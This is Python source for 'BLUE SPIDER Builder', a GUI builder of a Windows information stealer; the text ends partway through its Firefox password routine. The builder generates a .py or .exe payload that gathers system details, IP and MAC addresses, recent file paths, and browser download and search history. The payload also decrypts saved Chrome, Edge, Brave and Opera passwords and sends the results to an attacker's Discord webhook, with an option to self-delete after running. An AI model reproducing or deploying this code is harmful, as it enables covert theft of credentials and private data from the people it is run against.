# (c) 2026 IxilaA1 - Tous droits réservés / All rights reserved / Todos los derechos reservados.
# Ce code ne peut être ni vendu, ni modifié, ni partagé sans autorisation, ni publié à votre nom.
# This code may not be sold, modified, or shared without authorization, nor published under your name.
# Este código no puede ser vendido, modificado ni compartido sin autorización, ni publicado a su nombre.
# -------------------------------------------------------------------------------------------------------
import os
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import subprocess
import sys
import platform
import getpass
import uuid
import re
import requests
import shutil
import time
import threading
import zipfile
from datetime import datetime, timedelta

logo_ascii = """
                                                                                   ^                      
                                                                                 J@@M                     
                                                                        ^         @@@@^                   
                                                                     ;@@@>         J@@@                   
                                                                      ;@@@J      ;j j@@@}                 
                                                                       ^@@@O  ^J@@@@^;@@@}                
                                                                   >@@@; @@@@^;@@@@@> ;@@@O               
                                                                >j _@@@@j p@@@^;@|      @@@>              
                                                              }@@@@  @@@@j J@@@>                          
                                                          ^a@@ _@@@@;_@@@@a }@@@>                         
                                                       ^} v@@@@^;@@@@@@@@@@@ >@@@v                        
                                                     |@@@@ ^@@@@J@@@@@@@@@@@@;^@@@J                       
                                                  J@M }@@@@ _@@@@@@@@@@@@@@j    @@j                       
                                               ; v@@@@ >@@@@@@@@@@@@@@@@j                                 
                                            ^@@@@ ;@@@@v@@@@@@@@@@@@@j^                                   
                                            a@@@@@ >@@@@@@@@@@@@@@a                                       
                                            |@@@@@@@@@@@@@@@@@@J                                          
                                          |a ;@@@@@@@@@@@@@@a;                                            
                                         @@@@ ;@@@@@@@@@@@;                                               
                                        |@@@@@> @@@@@@@>                                                  
                                     }@@@pO@MJ   >pp_                                                     
                                  ;@@@a                                                                   
                               ;@@@p;                                                                     
                            >p@@M>                                                                        
                           }@@>      
"""

os.system('cls' if os.name == 'nt' else 'clear')
print(logo_ascii)
time.sleep(2)

class VirusBuilderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("BLUE SPIDER Builder v1.0 - Complete")
        self.root.geometry("720x680")
        self.root.minsize(680, 630)
        self.root.resizable(True, True)
        
        self.setup_theme()
        
        self.username = getpass.getuser()
        self.base_path = f"C:\\Users\\{self.username}\\OneDrive\\Bureau\\BLUE_SPIDER_free"
        self.output_path = os.path.join(self.base_path, "1-Output")
        
        os.makedirs(self.output_path, exist_ok=True)
        
        self.setup_ui()
        
    def setup_theme(self):
        self.colors = {
            'bg_dark': '#1a1a1a',
            'bg_medium': '#2d2d2d',
            'bg_light': '#3d3d3d',
            'fg_white': '#ffffff',
            'fg_gray': '#cccccc',
            'accent_blue': '#00a8ff',
            'accent_blue_light': '#7ed6df',
            'accent_blue_dark': '#192a56',
            'success_green': '#4cd137',
            'error_red': '#e84118',
            'warning_yellow': '#fbc531'
        }
        
        self.root.configure(bg=self.colors['bg_dark'])
        
    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg=self.colors['bg_dark'])
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        header_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        header_frame.pack(fill=tk.X, pady=(0, 15))
        
        title_label = tk.Label(header_frame, text="BLUE SPIDER", 
                              font=('Arial', 28, 'bold'),
                              fg=self.colors['accent_blue'],
                              bg=self.colors['bg_dark'])
        title_label.pack(side=tk.LEFT)
        
        version_label = tk.Label(header_frame, text="v8.0 - Complete History", 
                                font=('Arial', 12),
                                fg=self.colors['fg_gray'],
                                bg=self.colors['bg_dark'])
        version_label.pack(side=tk.LEFT, padx=(10, 0))
        
        separator = tk.Frame(main_frame, height=1, bg=self.colors['bg_light'])
        separator.pack(fill=tk.X, pady=(0, 20))
        
        webhook_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        webhook_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(webhook_frame, text="Discord Webhook:", 
                fg=self.colors['fg_white'],
                bg=self.colors['bg_dark'],
                font=('Arial', 11)).pack(anchor=tk.W)
        
        webhook_input_frame = tk.Frame(webhook_frame, bg=self.colors['bg_dark'])
        webhook_input_frame.pack(fill=tk.X, pady=5)
        
        self.webhook_url = tk.StringVar()
        webhook_entry = tk.Entry(webhook_input_frame, 
                                textvariable=self.webhook_url,
                                bg=self.colors['bg_medium'],
                                fg=self.colors['fg_white'],
                                insertbackground=self.colors['fg_white'],
                                relief=tk.FLAT,
                                font=('Arial', 10))
        webhook_entry.pack(side=tk.LEFT, padx=(0, 10), fill=tk.X, expand=True)
        
        test_btn = tk.Button(webhook_input_frame, text="Test", 
                           command=self.test_webhook,
                           bg=self.colors['accent_blue'],
                           fg=self.colors['fg_white'],
                           relief=tk.FLAT,
                           padx=15,
                           pady=5,
                           cursor='hand2',
                           font=('Arial', 10))
        test_btn.pack(side=tk.RIGHT)
        
        options_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        options_frame.pack(fill=tk.X, pady=(0, 20))
        
        tk.Label(options_frame, text="Collection Options:", 
                fg=self.colors['fg_white'],
                bg=self.colors['bg_dark'],
                font=('Arial', 11, 'bold')).pack(anchor=tk.W, pady=(0, 10))
        
        self.options = {}
        
        sys_frame = tk.Frame(options_frame, bg=self.colors['bg_medium'], relief=tk.FLAT, bd=1)
        sys_frame.pack(fill=tk.X, pady=5)
        
        sys_header = tk.Frame(sys_frame, bg=self.colors['bg_light'])
        sys_header.pack(fill=tk.X, padx=1, pady=1)
        
        self.options["system_info"] = tk.BooleanVar(value=True)
        sys_check = tk.Checkbutton(sys_header, 
                                  text="📊 SYSTEM INFORMATION",
                                  variable=self.options["system_info"],
                                  bg=self.colors['bg_light'],
                                  fg=self.colors['fg_white'],
                                  selectcolor=self.colors['bg_light'],
                                  activebackground=self.colors['bg_light'],
                                  font=('Arial', 11, 'bold'))
        sys_check.pack(side=tk.LEFT, padx=10, pady=8)
        
        sys_desc = tk.Label(sys_frame, 
                          text="  • Username • PC Name • IP • OS • MAC",
                          bg=self.colors['bg_medium'],
                          fg=self.colors['fg_gray'],
                          justify=tk.LEFT,
                          font=('Arial', 9))
        sys_desc.pack(anchor=tk.W, padx=30, pady=8)
        
        files_frame = tk.Frame(options_frame, bg=self.colors['bg_medium'], relief=tk.FLAT, bd=1)
        files_frame.pack(fill=tk.X, pady=5)
        
        files_header = tk.Frame(files_frame, bg=self.colors['bg_light'])
        files_header.pack(fill=tk.X, padx=1, pady=1)
        
        self.options["recent_files"] = tk.BooleanVar(value=True)
        files_check = tk.Checkbutton(files_header, 
                                    text="📁 RECENT FILES (30 days - names)",
                                    variable=self.options["recent_files"],
                                    bg=self.colors['bg_light'],
                                    fg=self.colors['fg_white'],
                                    selectcolor=self.colors['bg_light'],
                                    activebackground=self.colors['bg_light'],
                                    font=('Arial', 11, 'bold'))
        files_check.pack(side=tk.LEFT, padx=10, pady=8)
        
        files_desc = tk.Label(files_frame, 
                            text="  • Desktop, Documents, Downloads\n  • Names and paths of recently modified files",
                            bg=self.colors['bg_medium'],
                            fg=self.colors['fg_gray'],
                            justify=tk.LEFT,
                            font=('Arial', 9))
        files_desc.pack(anchor=tk.W, padx=30, pady=8)
        
        history_frame = tk.Frame(options_frame, bg=self.colors['bg_medium'], relief=tk.FLAT, bd=1)
        history_frame.pack(fill=tk.X, pady=5)
        
        history_header = tk.Frame(history_frame, bg=self.colors['bg_light'])
        history_header.pack(fill=tk.X, padx=1, pady=1)
        
        self.options["browser_history"] = tk.BooleanVar(value=True)
        history_check = tk.Checkbutton(history_header, 
                                      text="🌐 COMPLETE HISTORY (downloads + search)",
                                      variable=self.options["browser_history"],
                                      bg=self.colors['bg_light'],
                                      fg=self.colors['fg_white'],
                                      selectcolor=self.colors['bg_light'],
                                      activebackground=self.colors['bg_light'],
                                      font=('Arial', 11, 'bold'))
        history_check.pack(side=tk.LEFT, padx=10, pady=8)
        
        history_desc = tk.Label(history_frame, 
                              text="  • Chrome • Firefox • Edge • Opera • Brave\n  • Download history + Search history\n  • Visited URLs • Searched keywords",
                              bg=self.colors['bg_medium'],
                              fg=self.colors['fg_gray'],
                              justify=tk.LEFT,
                              font=('Arial', 9))
        history_desc.pack(anchor=tk.W, padx=30, pady=8)
        
        password_frame = tk.Frame(options_frame, bg=self.colors['bg_medium'], relief=tk.FLAT, bd=1)
        password_frame.pack(fill=tk.X, pady=5)
        
        password_header = tk.Frame(password_frame, bg=self.colors['bg_light'])
        password_header.pack(fill=tk.X, padx=1, pady=1)
        
        self.options["password_manager"] = tk.BooleanVar(value=True)
        password_check = tk.Checkbutton(password_header, 
                                      text="🔐 PASSWORD MANAGER (saved passwords)",
                                      variable=self.options["password_manager"],
                                      bg=self.colors['bg_light'],
                                      fg=self.colors['fg_white'],
                                      selectcolor=self.colors['bg_light'],
                                      activebackground=self.colors['bg_light'],
                                      font=('Arial', 11, 'bold'))
        password_check.pack(side=tk.LEFT, padx=10, pady=8)
        
        password_desc = tk.Label(password_frame, 
                               text="  • Chrome • Firefox • Edge • Opera • Brave\n  • Passwords • Emails • Accounts • Saved sites\n  • Format: link : google.com | email : user@gmail.com | password : 1234",
                               bg=self.colors['bg_medium'],
                               fg=self.colors['fg_gray'],
                               justify=tk.LEFT,
                               font=('Arial', 9))
        password_desc.pack(anchor=tk.W, padx=30, pady=8)
        
        separator2 = tk.Frame(main_frame, height=1, bg=self.colors['bg_light'])
        separator2.pack(fill=tk.X, pady=15)
        
        config_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        config_frame.pack(fill=tk.X, pady=(0, 15))
        
        name_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        name_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(name_frame, text="File Name:", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.filename = tk.StringVar(value="collector")
        name_entry = tk.Entry(name_frame, 
                            textvariable=self.filename,
                            bg=self.colors['bg_medium'],
                            fg=self.colors['fg_white'],
                            insertbackground=self.colors['fg_white'],
                            relief=tk.FLAT,
                            width=30)
        name_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        type_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        type_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(type_frame, text="File Type:", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.file_type = tk.StringVar(value="exe")
        type_combo = ttk.Combobox(type_frame, 
                                  textvariable=self.file_type,
                                  values=["exe", "py"],
                                  width=28,
                                  state='readonly')
        type_combo.pack(side=tk.LEFT)
        
        icon_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        icon_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(icon_frame, text="Icon (.ico):", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.icon_path = tk.StringVar()
        icon_entry = tk.Entry(icon_frame, 
                            textvariable=self.icon_path,
                            bg=self.colors['bg_medium'],
                            fg=self.colors['fg_white'],
                            insertbackground=self.colors['fg_white'],
                            relief=tk.FLAT,
                            width=23)
        icon_entry.pack(side=tk.LEFT, padx=(0, 5))
        
        browse_btn = tk.Button(icon_frame, text="Browse", 
                             command=self.browse_icon,
                             bg=self.colors['bg_light'],
                             fg=self.colors['fg_white'],
                             relief=tk.FLAT,
                             padx=10,
                             cursor='hand2')
        browse_btn.pack(side=tk.LEFT)
        
        autodelete_frame = tk.Frame(config_frame, bg=self.colors['bg_dark'])
        autodelete_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(autodelete_frame, text="Auto-delete:", 
                fg=self.colors['fg_white'], 
                bg=self.colors['bg_dark'],
                width=12, anchor='w',
                font=('Arial', 10)).pack(side=tk.LEFT)
        
        self.auto_delete = tk.BooleanVar(value=True)
        autodelete_check = tk.Checkbutton(autodelete_frame, 
                                        text="Delete after execution",
                                        variable=self.auto_delete,
                                        bg=self.colors['bg_dark'],
                                        fg=self.colors['fg_white'],
                                        selectcolor=self.colors['bg_dark'],
                                        activebackground=self.colors['bg_dark'])
        autodelete_check.pack(side=tk.LEFT)
        
        build_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        build_frame.pack(pady=15)
        
        self.build_btn = tk.Button(build_frame, text="🚀 GENERATE", 
                                  command=self.generate_file_thread,
                                  bg=self.colors['accent_blue'],
                                  fg=self.colors['fg_white'],
                                  font=('Arial', 12, 'bold'),
                                  relief=tk.FLAT,
                                  padx=30,
                                  pady=10,
                                  cursor='hand2',
                                  width=20)
        self.build_btn.pack()
        
        console_frame = tk.Frame(main_frame, bg=self.colors['bg_dark'])
        console_frame.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        self.console = tk.Text(console_frame, 
                              height=8,
                              bg=self.colors['bg_medium'],
                              fg=self.colors['fg_white'],
                              insertbackground=self.colors['fg_white'],
                              relief=tk.FLAT,
                              font=('Consolas', 9))
        self.console.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        console_scrollbar = tk.Scrollbar(console_frame, 
                                        bg=self.colors['bg_light'],
                                        troughcolor=self.colors['bg_dark'])
        console_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.console.config(yscrollcommand=console_scrollbar.set)
        console_scrollbar.config(command=self.console.yview)
        
        status_frame = tk.Frame(main_frame, bg=self.colors['bg_medium'], height=25)
        status_frame.pack(fill=tk.X, pady=(10, 0))
        
        self.status_label = tk.Label(status_frame, text="Ready - Password Manager included", 
                                    bg=self.colors['bg_medium'],
                                    fg=self.colors['fg_gray'],
                                    anchor=tk.W)
        self.status_label.pack(side=tk.LEFT, padx=10)
        
        self.output_path_label = tk.Label(status_frame, text=f"Output: {self.output_path}", 
                                        bg=self.colors['bg_medium'],
                                        fg=self.colors['accent_blue'],
                                        anchor=tk.E)
        self.output_path_label.pack(side=tk.RIGHT, padx=10)
        
    def log(self, message, msg_type="info"):
        colors = {
            "info": self.colors['fg_white'],
            "success": self.colors['success_green'],
            "error": self.colors['error_red'],
            "warning": self.colors['warning_yellow']
        }
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.insert(tk.END, f"[{timestamp}] {message}\n", msg_type)
        self.console.tag_config(msg_type, foreground=colors[msg_type])
        self.console.see(tk.END)
        self.root.update()
        self.status_label.config(text=message[:50] + "..." if len(message) > 50 else message)
        
    def test_webhook(self):
        webhook = self.webhook_url.get().strip()
        if not webhook:
            messagebox.showerror("Error", "Please enter a webhook URL")
            return
            
        self.log(f"🔍 Testing webhook...")
        
        try:
            data = {"content": "✅ Test successful from BLUE SPIDER v8.0 (Password Manager included)"}
            response = requests.post(webhook, json=data, timeout=10)
            
            if response.status_code == 204:
                self.log("✅ Webhook working!", "success")
                messagebox.showinfo("Success", "Webhook tested successfully!")
            else:
                self.log(f"❌ HTTP error: {response.status_code}", "error")
                messagebox.showerror("Error", f"HTTP error: {response.status_code}")
        except Exception as e:
            self.log(f"❌ Error: {str(e)}", "error")
            messagebox.showerror("Error", f"Error: {str(e)}")
            
    def browse_icon(self):
        filename = filedialog.askopenfilename(
            title="Select .ico icon",
            filetypes=[("ICO files", "*.ico"), ("All files", "*.*")]
        )
        if filename:
            self.icon_path.set(filename)
            self.log(f"📁 Icon selected: {filename}")
            
    def generate_file_thread(self):
        thread = threading.Thread(target=self.generate_file)
        thread.daemon = True
        thread.start()
            
    def generate_file(self):
        self.build_btn.config(state=tk.DISABLED, bg=self.colors['bg_light'])
        
        try:
            selected_options = [key for key, var in self.options.items() if var.get()]
            
            if not selected_options:
                messagebox.showerror("Error", "Please select at least one option")
                return
                
            webhook = self.webhook_url.get().strip()
            if not webhook:
                messagebox.showerror("Error", "Please enter a webhook URL")
                return
                
            filename = self.filename.get().strip()
            if not filename:
                filename = "collector"
                
            filename = re.sub(r'[^\w\-_\. ]', '_', filename)
            icon_path = self.icon_path.get().strip()
            file_type = self.file_type.get()
            auto_delete = self.auto_delete.get()
            
            self.log("="*60)
            self.log("🚀 GENERATING COLLECTOR", "success")
            self.log("="*60)
            self.log(f"📊 Options: {', '.join(selected_options)}")
            
            source_code = self.generate_source_code(selected_options, webhook, auto_delete)
            
            py_file = os.path.join(self.output_path, f"{filename}.py")
            with open(py_file, 'w', encoding='utf-8') as f:
                f.write(source_code)
                
            self.log(f"✅ Python file generated: {py_file}", "success")
            
            if file_type == "exe":
                self.convert_to_exe(py_file, filename, icon_path)
            else:
                self.log("\n✅ File generated successfully!", "success")
                messagebox.showinfo("Success", f"File generated!\n\nLocation: {py_file}")
                    
        except Exception as e:
            self.log(f"❌ Error: {str(e)}", "error")
            messagebox.showerror("Error", f"Error: {str(e)}")
            
        finally:
            self.build_btn.config(state=tk.NORMAL, bg=self.colors['accent_blue'])
    
    def generate_source_code(self, selected_options, webhook, auto_delete):
        code = f'''import os
import sys
import platform
import getpass
import socket
import uuid
import requests
from datetime import datetime, timedelta
import tempfile
import shutil
import sqlite3
import time
import threading
import zipfile
import json
import base64
import win32crypt
import subprocess

WEBHOOK_URL = "{webhook}"
TEMP_DIR = tempfile.mkdtemp()
RESULTS_DIR = os.path.join(TEMP_DIR, "results")
os.makedirs(RESULTS_DIR, exist_ok=True)

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return "Not available"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return socket.gethostbyname(socket.gethostname())

def get_mac_address():
    try:
        return ':'.join(['{{:02x}}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
    except:
        return "Not available"

def get_system_info():
    info = []
    info.append("=== SYSTEM INFORMATION ===")
    info.append(f"Date: {{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}}")
    info.append(f"User: {{getpass.getuser()}}")
    info.append(f"Hostname: {{socket.gethostname()}}")
    info.append(f"OS: {{platform.system()}} {{platform.release()}}")
    info.append(f"Architecture: {{platform.machine()}}")
    info.append(f"Processor: {{platform.processor()}}")
    info.append(f"Local IP: {{get_local_ip()}}")
    info.append(f"Public IP: {{get_public_ip()}}")
    info.append(f"MAC Address: {{get_mac_address()}}")
    return "\\n".join(info)

def get_recent_files():
    files = []
    paths = [
        os.path.expanduser("~\\\\Desktop"),
        os.path.expanduser("~\\\\Documents"),
        os.path.expanduser("~\\\\Downloads"),
    ]
    cutoff = datetime.now() - timedelta(days=30)
    
    for path in paths:
        if os.path.exists(path):
            files.append(f"\\n--- {{path}} ---")
            try:
                for root, dirs, filenames in os.walk(path):
                    for f in filenames[:20]:
                        try:
                            p = os.path.join(root, f)
                            if datetime.fromtimestamp(os.path.getmtime(p)) > cutoff:
                                files.append(p)
                        except:
                            pass
            except:
                pass
    
    result = "=== RECENT FILES (30 DAYS) ===\\n"
    result += "\\n".join(files[:200])
    return result

def get_browser_downloads():
    downloads = []
    downloads_file = os.path.join(RESULTS_DIR, "downloads_history.txt")
    
    chrome = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History")
    if os.path.exists(chrome):
        try:
            temp = os.path.join(TEMP_DIR, "chrome.db")
            shutil.copy2(chrome, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, start_time, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Chrome - File: {{row[0]}} | URL: {{row[2] if row[2] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except Exception as e:
            downloads.append(f"Chrome: Read error - {{str(e)}}")
    
    firefox = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles")
    if os.path.exists(firefox):
        try:
            for profile in os.listdir(firefox):
                if profile.endswith('.default-release'):
                    places = os.path.join(firefox, profile, "places.sqlite")
                    if os.path.exists(places):
                        temp = os.path.join(TEMP_DIR, "firefox.db")
                        shutil.copy2(places, temp)
                        conn = sqlite3.connect(temp)
                        c = conn.cursor()
                        c.execute("SELECT url, content FROM moz_places WHERE url LIKE '%download%' LIMIT 30")
                        for row in c.fetchall():
                            downloads.append(f"Firefox - URL: {{row[0][:100]}}")
                        conn.close()
                        os.remove(temp)
                        break
        except Exception as e:
            downloads.append(f"Firefox: Read error - {{str(e)}}")
    
    edge = os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\History")
    if os.path.exists(edge):
        try:
            temp = os.path.join(TEMP_DIR, "edge.db")
            shutil.copy2(edge, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Edge - File: {{row[0]}} | URL: {{row[1] if row[1] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except Exception as e:
            downloads.append(f"Edge: Read error - {{str(e)}}")
    
    opera = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\History")
    if os.path.exists(opera):
        try:
            temp = os.path.join(TEMP_DIR, "opera.db")
            shutil.copy2(opera, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Opera - File: {{row[0]}} | URL: {{row[1] if row[1] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except Exception as e:
            downloads.append(f"Opera: Read error - {{str(e)}}")
    
    brave = os.path.expanduser("~\\\\AppData\\\\Local\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\History")
    if os.path.exists(brave):
        try:
            temp = os.path.join(TEMP_DIR, "brave.db")
            shutil.copy2(brave, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT target_path, tab_url FROM downloads ORDER BY start_time DESC LIMIT 30")
            for row in c.fetchall():
                downloads.append(f"Brave - File: {{row[0]}} | URL: {{row[1] if row[1] else 'N/A'}}")
            conn.close()
            os.remove(temp)
        except Exception as e:
            downloads.append(f"Brave: Read error - {{str(e)}}")
    
    with open(downloads_file, 'w', encoding='utf-8') as f:
        f.write("=== DOWNLOAD HISTORY ===\\n\\n")
        f.write("\\n".join(downloads))
    
    return downloads_file

def get_browser_search_history():
    searches = []
    searches_file = os.path.join(RESULTS_DIR, "search_history.txt")
    
    chrome = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\History")
    if os.path.exists(chrome):
        try:
            temp = os.path.join(TEMP_DIR, "chrome_search.db")
            shutil.copy2(chrome, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%google.com/search%' OR url LIKE '%youtube.com/results%' OR url LIKE '%bing.com/search%' OR url LIKE '%yahoo.com/search%' ORDER BY last_visit_time DESC LIMIT 50")
            for row in c.fetchall():
                searches.append(f"Chrome - {{row[1]}} | {{row[0][:100]}}")
            conn.close()
            os.remove(temp)
        except Exception as e:
            searches.append(f"Chrome: Read error - {{str(e)}}")
    
    firefox = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles")
    if os.path.exists(firefox):
        try:
            for profile in os.listdir(firefox):
                if profile.endswith('.default-release'):
                    places = os.path.join(firefox, profile, "places.sqlite")
                    if os.path.exists(places):
                        temp = os.path.join(TEMP_DIR, "firefox_search.db")
                        shutil.copy2(places, temp)
                        conn = sqlite3.connect(temp)
                        c = conn.cursor()
                        c.execute("SELECT url, title FROM moz_places WHERE url LIKE '%google.com/search%' OR url LIKE '%youtube.com/results%' OR url LIKE '%bing.com/search%' LIMIT 50")
                        for row in c.fetchall():
                            searches.append(f"Firefox - {{row[1]}} | {{row[0][:100]}}")
                        conn.close()
                        os.remove(temp)
                        break
        except Exception as e:
            searches.append(f"Firefox: Read error - {{str(e)}}")
    
    edge = os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\History")
    if os.path.exists(edge):
        try:
            temp = os.path.join(TEMP_DIR, "edge_search.db")
            shutil.copy2(edge, temp)
            conn = sqlite3.connect(temp)
            c = conn.cursor()
            c.execute("SELECT url, title FROM urls WHERE url LIKE '%google.com/search%' OR url LIKE '%bing.com/search%' ORDER BY last_visit_time DESC LIMIT 50")
            for row in c.fetchall():
                searches.append(f"Edge - {{row[1]}} | {{row[0][:100]}}")
            conn.close()
            os.remove(temp)
        except Exception as e:
            searches.append(f"Edge: Read error - {{str(e)}}")
    
    with open(searches_file, 'w', encoding='utf-8') as f:
        f.write("=== SEARCH HISTORY ===\\n\\n")
        f.write("\\n".join(searches))
    
    return searches_file

def get_chrome_passwords():
    passwords = []
    chrome_path = os.path.expanduser("~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data")
    
    if not os.path.exists(chrome_path):
        return passwords
    
    try:
        temp_db = os.path.join(TEMP_DIR, "chrome_login.db")
        shutil.copy2(chrome_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
        
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            try:
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                if decrypted_password:
                    decrypted_password = decrypted_password.decode('utf-8')
                else:
                    decrypted_password = "[EMPTY]"
                    
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : {{decrypted_password}}")
            except Exception as e:
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : [DECRYPT ERROR: {{str(e)}}]")
        
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        passwords.append(f"Chrome - Error: {{str(e)}}")
    
    return passwords

def get_edge_passwords():
    passwords = []
    edge_path = os.path.expanduser("~\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data")
    
    if not os.path.exists(edge_path):
        return passwords
    
    try:
        temp_db = os.path.join(TEMP_DIR, "edge_login.db")
        shutil.copy2(edge_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            try:
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                if decrypted_password:
                    decrypted_password = decrypted_password.decode('utf-8')
                else:
                    decrypted_password = "[EMPTY]"
                    
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : {{decrypted_password}}")
            except Exception as e:
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : [DECRYPT ERROR]")
        
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        passwords.append(f"Edge - Error: {{str(e)}}")
    
    return passwords

def get_brave_passwords():
    passwords = []
    brave_path = os.path.expanduser("~\\\\AppData\\\\Local\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Login Data")
    
    if not os.path.exists(brave_path):
        return passwords
    
    try:
        temp_db = os.path.join(TEMP_DIR, "brave_login.db")
        shutil.copy2(brave_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            try:
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                if decrypted_password:
                    decrypted_password = decrypted_password.decode('utf-8')
                else:
                    decrypted_password = "[EMPTY]"
                    
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : {{decrypted_password}}")
            except Exception as e:
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : [DECRYPT ERROR]")
        
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        passwords.append(f"Brave - Error: {{str(e)}}")
    
    return passwords

def get_opera_passwords():
    passwords = []
    opera_path = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Login Data")
    
    if not os.path.exists(opera_path):
        return passwords
    
    try:
        temp_db = os.path.join(TEMP_DIR, "opera_login.db")
        shutil.copy2(opera_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2]
            
            try:
                decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                if decrypted_password:
                    decrypted_password = decrypted_password.decode('utf-8')
                else:
                    decrypted_password = "[EMPTY]"
                    
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : {{decrypted_password}}")
            except Exception as e:
                passwords.append(f"link : {{origin_url}} | email : {{username}} | password : [DECRYPT ERROR]")
        
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        passwords.append(f"Opera - Error: {{str(e)}}")
    
    return passwords

def get_firefox_passwords():
    passwords = []
    firefox_path = os.path.expanduser("~\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles")
    
    if not os.path.exists(firefox_path):
        return passwords
    
    try:
        for profile in os.listdir(firefox_path):
            if profile.endswith('.default-release') or profile.endswith('.default'):
                logins_path = os.path.join(firefox_path, profile, "logins.json")
                
